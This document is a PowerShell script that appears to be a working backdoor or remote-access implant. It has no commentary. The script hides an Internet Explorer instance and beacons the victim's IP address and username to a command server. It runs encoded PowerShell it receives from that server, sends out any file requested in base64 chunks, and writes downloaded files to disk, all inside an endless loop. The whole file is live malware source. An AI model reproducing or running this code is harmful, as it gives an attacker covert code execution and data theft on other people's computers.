$CHUNK = 35000;
$LIMIT = 8500000;
$SRV = '';

function get {
  param($ie, $k, $d);
  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
  return $ie.document.lastchild.innertext;
}

function post {
  param($ie, $k, $d, $p);
  $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
  $ie.navigate2($SRV + "?$k=" + $x, 14, 0, [Text.Encoding]::UTF8.GetBytes("d=$p"), $null);
  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
}

function run {
  param($s, $ie);
  $tp = get $ie 'TxR' $s;
  if ($tp -ne '0') {
    $c = 3;
    $b = New-Object Collections.ArrayList;
    while (1) {
      $d = get $ie 'TxD' ($s + '|' + $c);
      if ($d -eq $null) {
        break;
      }
      $b.add($d) | out-null;
      $c++;
    }
    post $ie 'Tx' ($s + '|2') '0';
    if ($tp -eq '@') {
      $xc = $b -join '';
      $xc = $xc | out-string;
      $r = powershell.exe -nopr -noni -enc $xc;
      if ($r -eq $null) {
        $r = 'NULL';
      } else {
        $r = $r | out-string;
      }
      $r = $r.ToCharArray();
    } elseif ($tp -eq '^') {
      $r = [IO.file]::ReadAllBytes([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b -join '')));
      if ($r.length -ge $LIMIT) {
        $r = '';
      }
    } else {
      [IO.file]::WriteAllBytes("$tp", [Convert]::FromBase64String($b -join ''));
      $r = 'NULL'.ToCharArray();
    }
    $c = 3;
    $i = 0;
    while ($i -le ($r.length - $CHUNK)) {
      $x = [Convert]::ToBase64String($r[$i..($i + $CHUNK - 1)]);
      post $ie 'Rx' ($s + '|' + $c) $x;
      $i += $CHUNK;
      $c++;
    }
    $x = [Convert]::ToBase64String($r[$i..($r.length - 1)]);
    post $ie 'Rx' ($s + '|' + $c) $x;
    post $ie 'Rx' ($s + '|2') '1';
  }
}

while (1) {
  try {
    $ie = new-object -com internetexplorer.application;
    $ie.visible = $false;
    $ie.silent = $true;
    $ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1};
    $s = $ip.ipaddress[0] + '|' + $env:USERNAME;
    while (1) {
      run $s $ie;
      $d = Get-Random -InputObject 1, 2, 3;
      sleep -seconds $d;
      $ie.stop();
    }
  } catch {
    taskkill.exe /f /im iexplore.exe;
  }
}
